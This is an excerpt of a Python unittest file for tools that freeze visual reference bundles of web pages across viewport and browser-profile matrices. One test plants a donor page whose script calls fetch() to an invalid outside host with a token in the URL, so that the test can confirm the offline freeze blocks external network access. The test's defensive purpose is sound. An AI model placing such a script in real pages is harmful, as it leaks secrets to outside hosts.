...
class BrowserGateTests(unittest.TestCase):
    def test_raw_h2d_to_atomic_bundle_and_contract(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            ...
            subprocess.run([sys.executable, str(SKILL / "scripts" / "freeze_reference_bundle.py"), "--h2d", str(h2d), "--donor", str(donor), "--matrix", str(matrix), "--profiles", str(profiles), "--out", str(reference), "--project-root", str(SKILL)], cwd=SKILL, check=True)
            contract = contract_dir / "transfer_contract.json"
            subprocess.run([sys.executable, str(SKILL / "scripts" / "create_transfer_contract.py"), "--h2d", str(h2d), "--workspace-root", str(root), "--candidate-root", str(candidate), "--candidate-include", "index.html", "--candidate-include", "generate.py", "--profiles", str(profiles), "--height-map", str(heights), "--reference-bundle", str(reference / "reference_bundle.json"), "--current-command", json.dumps([sys.executable, "generate.py"]), "--expected-report", "reports/matrix_coverage.json", "--out", str(contract)], cwd=SKILL, check=True)
    ...
    def test_offline_freeze_blocks_external_network_and_covers_matrix(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            ...
            donor.write_text("""<!doctype html><style>body{margin:0;background:#eee}h1{font:700 32px Arial}</style><h1>Donor</h1><script>fetch('https://example.invalid/write?token=secret').catch(()=>{});</script>""", encoding="utf-8")
            matrix = root / "matrix.json"; profiles = root / "profiles.json"; out = root / "reference"
            matrix.write_text(json.dumps([{"width": 390, "height": 844, "kind": "decoded"}, {"width": 768, "height": 900, "kind": "interval-probe"}]), encoding="utf-8")
            profiles.write_text(json.dumps([{"id":"headless","headless":True,"device_scale_factor":1,"is_mobile":False,"has_touch":False,"locale":"en-US","timezone":"UTC","reduced_motion":"reduce"}]), encoding="utf-8")
            subprocess.run(["node", str(SKILL / "scripts" / "freeze_visual_reference.js"), "--donor", str(donor), "--matrix", str(matrix), "--profiles", str(profiles), "--out-dir", str(out), "--project-root", str(SKILL)], cwd=SKILL, check=True)
            manifest = json.loads((out / "visual_reference_manifest.json").read_text(encoding="utf-8"))
            self.assertEqual(manifest["result"], "pass")
            self.assertEqual(sorted(manifest["matrix_keys"]), ["390x844@headless", "768x900@headless"])
